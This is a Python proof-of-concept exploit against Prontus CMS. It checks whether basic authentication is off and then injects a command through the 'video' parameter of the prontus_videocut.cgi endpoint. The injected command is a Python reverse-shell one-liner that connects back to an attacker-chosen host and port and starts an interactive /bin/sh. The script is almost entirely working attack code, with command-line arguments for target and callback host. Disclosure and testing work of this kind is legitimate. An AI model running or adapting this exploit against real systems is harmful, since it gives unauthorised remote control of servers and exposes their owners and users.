#!/usr/bin/python3
# israel @ nivel4.com

import time
import argparse
import requests

def check_rce(host, prontus_id, rhost, rport, ssl_flag):
	""" """
	if(ssl_flag):
		prefix = "https://"
	else:
		prefix = "http://"

	url_cgi = "{}{}/cgi-cpn".format(prefix, host)
	print("[*] Checking if basic auth is enabled.")
	req = requests.get(url_cgi)

	if(req.status_code == 401):
		print("[*] Basic auth enabled. Aborting...")
		return

	print("[*] Basic auth disabled!")
	print("[*] Checking RCE...")


	cmd = "/usr/bin/python -c 'import socket,subprocess,os;s%3Dsocket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"{}\",{}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p%3Dsubprocess.call([\"/bin/sh\",\"-i\"]);'".format(rhost, rport)
	#url_check = "{}{}/cgi-cpn/xcoding/prontus_videocut.cgi".format(prefix, host)
	#start1 = time.time()
	#req = requests.get(url_check)
	#end1 = time.time()
	#t1 = end1-start1
	#check_code = req.status_code

	url_rce = "{}{}/cgi-cpn/xcoding/prontus_videocut.cgi?prontus_id={}&t1=1&t2=2&video=;{};/12345678/mmedia/multimedia_videoA123456.mpeg".format(prefix, host, prontus_id, cmd)
	#start2 = time.time()
	print("[*] sending shell oOoOoOoOoOoOoO!!!")
	req = requests.get(url_rce)
	#end2 = time.time()
	#t2 = end2-start2
	rce_code = req.status_code

	# remove check_code == 404 if url_rce is executed correctly but the script fails before url_del is fetched i.e. using torsocks
	#if(check_code == 200 and rce_code == 200):
	#if(rce_code == 200):
		#print("[*] normal response time: {}".format(t1))
		#print("[*] RCE response time: {}".format(t2))
		#print("[*] probability of RCE: {}".format(100*(t1/t2)))
	#else:
	#	print("[*] RCE failed :(")



def main():
	parser = argparse.ArgumentParser()
	parser.add_argument("host", help="target host (e.g. foo.bar)")
	parser.add_argument("prontus", help="target prontus ID (e.g. prontus_cms)")
	parser.add_argument("rhost", help="host for reverse shell")
	parser.add_argument("rport", help="port for reverse shell")
	parser.add_argument("--ssl", help="enable SSL", action="store_true")
	args = parser.parse_args()

	if(not args.host or not args.prontus or not args.rhost or not args.rport):
		print("Missing arguments. Try '{} --help' for more information.".format(__file__))
	else:
		print("#"*80)
		print("\n\t ~=== Prontus CMS RCE PoC ===~")
		print("\t+ target host: {}".format(args.host))
		print("\t+ prontus ID: {}".format(args.prontus))
		print("\t+ use ssl: {}".format(args.ssl))
		print("\t+ reverse shell to {}:{}\n".format(args.rhost, args.rport))
		check_rce(args.host, args.prontus, args.rhost, args.rport, args.ssl)
		print("#"*80)

	


if __name__ == '__main__':
	main()
